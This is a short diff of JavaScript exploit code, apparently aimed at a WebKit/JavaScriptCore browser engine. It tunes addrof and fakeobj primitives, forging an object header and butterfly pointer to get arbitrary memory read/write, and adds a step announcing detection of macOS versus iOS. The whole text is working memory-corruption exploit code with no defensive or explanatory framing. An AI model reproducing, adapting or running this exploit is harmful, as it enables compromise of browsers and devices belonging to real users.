@@ -565,7 +565,7 @@ b.process = (inputs, outputs, parameters)=>{
     print("[+] victim @ " + addrof(victim));
 
     // craft a fake object to modify victim
-    var flags_double_array = qwordAsTagged(0x0108200700001000);
+    var flags_double_array = 0x0108200700001000 - 0x02000000000000;
     var container = {
         header: flags_double_array,
         butterfly: victim
@@ -575,7 +575,7 @@ b.process = (inputs, outputs, parameters)=>{
     var containerAddr = addrof(container);
     print("[+] container @ " + containerAddr);
     // add the offset to let compiler recognize fake structure
-    var hax = fakeobj(containerAddr + 0x10);
+    var hax = fakeobj(containerAddr - 0x8);
     // origButterfly is now based on the offset of **victim** 
     // because it becomes the new butterfly pointer
     // and hax[1] === victim.pointer
@@ -644,10 +644,13 @@ b.process = (inputs, outputs, parameters)=>{
     var plainObj = {};
     var header = memory.read64(addrof(plainObj));
     memory.writeInt64(memory.addrof(container), header);
+	    
     //memory.test();
     //let memory.read_i64 = memory.read64;
      
     print("[+] arbitrary memory read/write working");
+	    print("now about to find out whether this exploit is running on mac or ios with function signatures...");
+	    
 	    return false;
     }
     //  sleep(2000);
